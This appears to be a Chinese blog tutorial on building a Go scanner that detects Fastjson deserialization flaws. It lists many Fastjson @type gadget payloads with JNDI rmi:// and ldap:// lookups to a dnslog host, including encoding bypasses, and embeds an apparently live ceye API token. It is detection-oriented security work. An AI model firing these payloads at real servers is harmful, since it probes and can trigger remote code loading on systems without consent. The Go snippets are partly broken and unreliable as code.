
# Golang编写Fastjson检测程序

基于上篇Fastjson文章大多在分析和测试其他师傅的思路，这里实践写一个检测程序

 - [ ] fastjson出网探测语句如下，借鉴blby师傅写过的Python脚本：
       
       {"@type":"java.net.Inet4Address","val":"http://dnslog"}
       
       {"@type":"java.net.Inet6Address","val":"http://dnslog"}
       
       {{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
       
       {"@type":"com.alibaba.fastjson.JSONObject", {"@type":
       "java.net.URL", "val":"http://dnslog"}}""}
       
       Set[{"@type":"java.net.URL","val":"http://dnslog"}]
       
       Set[{"@type":"java.net.URL","val":"http://dnslog"}
       
       {"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}
       
       {{"@type":"java.net.URL","val":"http://dnslog"}
       
       {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog",
       "autoCommit":true}
       
       {"@type":"com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName":"rmi://dnslog",
       "loginTimeout":0'}{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://dnslog",
       "autoCommit":true}
       
       {"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://dnslog",
       "autoCommit":true}
       
       {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"ldap://dnslog",
       "autoCommit":true}
       
       {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://dnslog"}}
       
       {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://dnslog","autoCommit":true}}
       
       {"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog"}
       
       {"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog"}
       
       {"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://dnslog"}
       
       {"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"ldap://dnslog"}{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://dnslog","Object":"a"}
       
       {"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://dnslog"}
       
       {"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor",
       "parameters":
       {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://dnslog"},
       "namespace":""}
       
       {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://dnslog"}
       
       {"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory",
       "jndiNames":["ldap://dnslog"], "Realms":[""]}
       
       {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://dnslog"}
       
       {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://dnslog"}
       
       {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://dnslog"}
       
       {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties":
       {"@type":"java.util.Properties","UserTransaction":"ldap://dnslog"}}
       
       {"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
       "jndiNames":["ldap://dnslog"], "tm": {"$ref":"$.tm"}}
       
       {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://dnslog","instance":{"$ref":"$.instance"}}
       
       {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://dnslog"}
       
       {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://dnslog"}
       
       {"@type":"com.caucho.config.types.ResourceRef","lookupName":
       "ldap://dnslog", "value": {"$ref":"$.value"}}
       
       {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {
       "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {/*s6*/"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {\n"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {"@type"\b:"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {"\u0040\u0074\u0079\u0070\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}
       
       {"\x40\x74\x79\x70\x65":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://dnslog","autoCommit":true}

请求方式为POST，最多再加几个headers，这里面还没算上加上bypass的

## 1.showinfo

编写showinfo输出漏洞信息

> // VulnInfo contains the Vulnerability information about
> CVE-2021-41277
> 
> type VulnInfo struct {
> 
> Name string
> 
> VulID string
> 
> Version string
> 
> Author string
> 
> VulDate string
> 
> References []string
> 
> AppName string
> 
> AppPowerLink string
> 
> AppVersion string
> 
> VulType string
> 
> Description string
> 
> Category string
> 
> Dork QueryDork
> 
> }
> 
> type QueryDork struct {
> 
> Fofa string
> 
> Quake string
> 
> Zoomeye string
> 
> Shodan string
> 
> }
> 
> func showInfo()
> 
> { info :=
> 
> VulnInfo{
> 
> Name: "Fastjson Deserialize RCE",
> 
> VulID: "",
> 
> Version: "1.0",
> 
> Author: "youqi",
> 
> VulDate: "2022-5-16",
> 
> References: []string{"https://www.jianshu.com/p/1ed027080459"},
> 
> AppName: "Fastjson",
> 
> AppPowerLink: "",
> 
> AppVersion: "",
> 
> Description: "阿里巴巴开源的Java对象和JSON格式字符串的快速转换的工具库",
> 
> Dork: QueryDork{Fofa: `app="Fastjson"`},
> 
> }
> 
> vulnJson, err := json.MarshalIndent(info, "", "")
> 
> if err != nil {
> 
> fmt.Println(err)
> 
> }
> 
> fmt.Print(string(vulnJson))
> 
> }

## 2.参数解析

> // Options contains the configuration options type Options struct {
> 
> ShowInfo bool //ShowInfo is a flag indicates whether to show vuln info
> ou
> 
> Stdin bool // Stdin specifies whether stdin input was given to the pro
> 
> Timeout int // Timeout is the seconds to wait for sources to respond
> 
> Target string // Target to verfity
> 
> TargetsFile string // TargetsFile containing list of targets to
> verfity
> 
> Output io.Writer
> 
> OutputFile string // Output is the file to write found subdomains to.
> 
> }
> 
> // parseOptions parses the command line flags provided by a user
> 
> func parseOptions() *Options {
> 
> options := &Options{}
> 
> flag.BoolVar(&options.ShowInfo, "s", false, "Show VulnInfo output")
> flag.StringVar(&options.Target, "u", "", "Target to verfity Fastjson
> RCE") flag.StringVar(&options.TargetsFile, "f", "", "File containing
> list of targets") flag.StringVar(&options.OutputFile, "o", "", "File
> to write output to")
> 
> flag.Parse()
> 
> // Default output is stdout
> 
> options.Output = os.Stdout
> 
> // Check if stdin pipe was given
> 
> options.Stdin = hasStdin()
> 
> if options.ShowInfo {
> 
> gologger.Info().Msg("VulnInfo:\n")
> 
> showInfo()
> 
> os.Exit(0)
> 
> }
> 
> // Validate the options passed by the user and if any
> 
> // invalid options have been used, exit.
> 
> err := options.validateOptions()
> 
> if err != nil {
> 
> gologger.Fatal().Msgf("Program exiting: %s\n", err)
> 
> }
> 
> return options
> 
> }
> 
> func hasStdin() bool {
> 
> stat, err := os.Stdin.Stat()
> 
> if err != nil {
> 
> return false
> 
> }
> 
> isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
> 
> isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0
> 
> return isPipedFromChrDev || isPipedFromFIFO
> 
> }
> 
> // validateOptions validates the configuration options passed
> 
> func (options *Options) validateOptions() error {
> 
> // Check if target, list of targets, or stdin info was provided.
> 
> // If none was provided, then return.
> 
> if options.Target == "" && options.TargetsFile == "" && !options.Stdin
> {
> 
> return errors.New("no input list provided")
> 
> }
> 
> return nil
> 
> }
> 
> func main() {
> 
> // Parse the command line flags
> 
> options := parseOptions()
> 
> fmt.Print(options)
> 
> }
> 
> ## 3.漏洞验证
> 
> go自带的net/http库验证漏洞时会很慢，可以使用resty库重写一个，效率会更高
> 
> [GitHub - go-resty/resty: Simple HTTP and REST client library for
> Go](https://github.com/go-resty/resty)
> 
> 需要使用resty库重写请求方式，并添加循环请求不同的Payload
> 
> Payload从固定的文件中读取，读取时替换dnslog部分（使用strings库），为了唯一性在dnslog前添加时间戳使其唯一
> 
> 每次POST后请求ceye的API看看有没有对应dnslog的请求结果
> 
> func verify(target string) string {
> 
> file, err := os.Open("poc.txt")
> 
> if err != nil {
> 
> log.Printf("Cannot open text file: %s, err: [%v]", textfile, err)
> 
> return err
> 
> }
> 
> defer file.Close()
> 
> scanner := bufio.NewScanner(file)
> 
> for scanner.Scan() {
> 
> timeUnix:=time.Now().Unix() + ".qsu9q8.ceye.io"
> 
> line := scanner.Text()
> 
> line2 := strings.ReplaceAll(line,"dnslog", timeUnix)
> 
> url := target
> 
> client := resty.New()
> 
> client.SetTimeout(15 * time.Second)
> 
> resp, err :=
> client.R().EnableTrace().client.R().SetHeader("Content-Type",
> "application/json").SetBody(line2).Post(url)
> 
> if err != nil {
> 
> gologger.Warning().Msg("Request error: " + target)
> 
> } else {
> 
> client := resty.New()
> 
> client.SetTimeout(15 * time.Second)
> 
> resp, err :=
> client.R().EnableTrace().client.R().SetHeader("User-Agent","
> Chrome/83.0.4103.116
> Safari/537.36").Get("http://api.ceye.io/v1/records?token=019a2710d2d038d74ee7372cbbd6efe3&type=dns&filter=")
> 
> if resp.StatusCode() == http.StatusOK {
> 
> if strings.Contains(resp,timeUnix) {
> 
> //gologger.Info().Msg(target + " is vulnerable")
> 
> return target
> 
> } else {
> 
> gologger.Warning().Msg("no vulnerable")
> 
> }
> 
> } else {
> 
> gologger.Warning().Msg("no vulnerable")
> 
> }
> 
> }
> 
> return ""
> 
> }
> 
> }

## 4.runner

> func runner(options *Options) error {
> 
> targets := []string{}
> 
> outputs := []io.Writer{options.Output}
> 
> if options.OutputFile != "" {
> 
> file, err := createFile(options.OutputFile, false) if err != nil {
> 
> gologger.Error().Msgf("Could not create file %s for %s: %s\n", options
> 
> return err
> 
> }
> 
> defer file.Close()
> 
> outputs = append(outputs, file)
> 
> }
> 
> if options.Target != "" {
> 
> // If output file specified, create file
> 
> targets = targetParser(options.Target)
> 
> }
> 
> if options.TargetsFile != "" {
> 
> reader, err := os.Open(options.TargetsFile)
> 
> if err != nil {
> 
> return err
> 
> }
> 
> scanner := bufio.NewScanner(reader)
> 
> for scanner.Scan() {
> 
> target := scanner.Text()
> 
> if target == "" {
> 
> continue
> 
> }
> 
> targets = append(targets, targetParser(target)...)
> 
> }
> 
> reader.Close()
> 
> return err
> 
> }
> 
> if options.Stdin {
> 
> scanner := bufio.NewScanner(os.Stdin)
> 
> for scanner.Scan() {
> 
> target := scanner.Text()
> 
> if target == "" {
> 
> continue
> 
> }
> 
> targets = append(targets, targetParser(target)...)
> 
> }
> 
> }
> 
> var finalresult []string
> 
> for _, t := range targets {
> 
> //gologger.Info().Msg(t)
> 
> res := verify(t)
> 
> if res != "" {
> 
> //gologger.Info().Msg(res)
> 
> finalresult = append(finalresult, t)
> 
> }
> 
> }
> 
> var err error
> 
> for _, w := range outputs {
> 
> err = writePlainResult(finalresult, w)
> 
> if err != nil {
> 
> gologger.Error().Msgf("Could not verbose results, Error: %s\n", err)
> 
> return err
> 
> }
> 
> }
> 
> return nil
> 
> }

## 5.并发

选择 sync 库来控制并发，需要修改runner和验证部分的代码

> var finalresult []string
> 
> var resChannel = make(chan string, 15)
> 
> wgResult := &sync.WaitGroup{}
> 
> go func() {
> 
> wgResult.Add(1)
> 
> for res := range resChannel {
> 
> finalresult = append(finalresult, res)
> 
> }
> 
> wgResult.Done()
> 
> }()
> 
> wg := sync.WaitGroup{}
> 
> for _, t := range targets {
> 
> //gologger.Info().Msg(t)
> 
> wg.Add(1)
> 
> go verify(t, resChannel, &wg)
> 
> //if res != "" {
> 
> // //gologger.Info().Msg(res)
> 
> // finalresult = append(finalresult, t)
> 
> //}
> 
> }
> 
> wg.Wait()
> 
> close(resChannel)
> 
> wgResult.Wait()
> 
> //fmt.Print(finalresult)
> 
> func verify(target string, result chan string, wg *sync.WaitGroup)
> 
> { defer wg.Done()

## 6.一些代码错误

涉及Golang语法和格式问题

**if…else 语句中的 else 必须和 if 的 ’ } ’ 在同一行，否则编译错误**

定义后不使用的参数，需要用下划线替换

为了方便添加了fmt打印方法查看流程，在实际测试时发现ceye返回的信息为空，问题在于json解码器不支持http请求

此外和curl不同，resty请求不添加header直接post会造成请求方法错误

![]([![O4GRw6.png](https://s1.ax1x.com/2022/05/17/O4GRw6.png)](https://imgtu.com/i/O4GRw6))

原来想用ceye探测回显内容，但是平台一直不稳定，就用了dig.pm

![]([![O4GWTK.png](https://s1.ax1x.com/2022/05/17/O4GWTK.png)](https://imgtu.com/i/O4GWTK))

使用时修改172行的dnslog地址以及190行SetBody中domain和token值

![]([![O4GUe0.png](https://s1.ax1x.com/2022/05/17/O4GUe0.png)](https://imgtu.com/i/O4GUe0))

## 附录-参考文章

[03-使用GO编写POC - d4m1ts 知识库](https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/03.%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/GO/03.%E4%BD%BF%E7%94%A8GO%E7%BC%96%E5%86%99POC.html)

[Golang Poc编写规范](https://t.zsxq.com/yNBEiei)
